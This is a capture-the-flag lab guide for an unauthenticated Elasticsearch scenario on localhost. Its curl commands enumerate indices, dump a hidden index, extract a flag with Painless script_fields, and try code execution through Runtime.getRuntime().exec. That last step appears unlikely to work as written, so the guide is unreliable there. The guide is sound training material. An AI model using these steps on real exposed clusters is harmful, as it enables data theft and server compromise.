# DB-07: Elasticsearch Script Injection

## 场景信息

| 字段 | 值 |
|---|---|
| ID | DB-07 |
| 名称 | Elasticsearch Script Injection |
| 技术/CVE | N/A (script injection) |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10207 |

## 场景概述
- 技术：N/A (script injection)
- 难度：L2
- 交付方式：docker
- 入口端口：10207
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (Unauthenticated Access + Painless Script Injection) |
| Difficulty | L2 |
| Port | 10207 |
| Path | scenarios/db/elasticsearch-script/ |
| Type | docker |
| Database | Elasticsearch 8.11.0 |

### Attack Path Summary
```
Access unauthenticated Elasticsearch REST API → List indices → Discover hidden_config index → Retrieve flag via GET request → Demonstrate painless script_fields injection
```

### Prerequisites

#### Knowledge
- Elasticsearch REST API: Understanding HTTP endpoints for querying indices, documents, and cluster information
- Index enumeration: Discovering hidden or non-public indices via the `_cat/indices` and `_aliases` API endpoints
- Painless scripting: Using Elasticsearch's Painless scripting language in `script_fields` to extract data dynamically
- Elasticsearch query DSL: Constructing JSON request bodies for search and field retrieval

#### Tools
- curl: Sending HTTP requests to the Elasticsearch REST API

### Step-by-Step Exploitation

#### Step 1: Check Cluster Health

Verify the Elasticsearch instance is accessible and responsive.

```bash
curl -s http://localhost:10207/
```

#### Step 2: List All Indices

Enumerate all indices in the cluster, including hidden or system indices.

```bash
curl -s http://localhost:10207/_cat/indices?v
```

Expected output includes indices such as `hidden_config`, `movies`, or other application-specific indices.

#### Step 3: Retrieve Documents from hidden_config

Query the `hidden_config` index to retrieve all documents.

```bash
curl -s http://localhost:10207/hidden_config/_search?pretty
```

If the flag is directly in the response, extract it. If not, query all documents:

```bash
curl -s -X POST http://localhost:10207/hidden_config/_search?pretty \
  -H "Content-Type: application/json" \
  -d '{"query": {"match_all": {}}}'
```

#### Step 4: Extract Flag via Painless Script Injection

If the flag is obfuscated or stored in a computed field, use Painless `script_fields` to extract or derive it.

```bash
curl -s -X POST http://localhost:10207/hidden_config/_search?pretty \
  -H "Content-Type: application/json" \
  -d '{
    "query": {"match_all": {}},
    "script_fields": {
      "extracted_flag": {
        "script": {
          "lang": "painless",
          "source": "doc[\"flag\"].value"
        }
      }
    }
  }'
```

#### Step 5: Demonstrate Painless Script Injection for RCE

If the cluster has scripting enabled, demonstrate arbitrary code execution via Painless:

```bash
curl -s -X POST http://localhost:10207/_scripts/painless_execute?pretty \
  -H "Content-Type: application/json" \
  -d '{
    "script": {
      "lang": "painless",
      "source": "Runtime.getRuntime().exec(\"cat /flag.txt\")"
    }
  }'
```

### Flag Location
- Stored as a field in the `hidden_config` index in Elasticsearch
- Accessible via REST API without authentication

### Verification Commands
```bash
curl -s -X POST http://localhost:10207/hidden_config/_search -H "Content-Type: application/json" -d '{"query":{"match_all":{}}}' | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Elasticsearch HTTP API and Painless scripting |
| 侦察与前置条件 | Index/document discovery and script-enabled endpoint identification |
| 核心漏洞与利用 | Submit a malicious Elasticsearch script query |
| 权限、横向或影响 | Server-side script execution or data exfiltration |
| 验证 | Use the script/query result to obtain the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
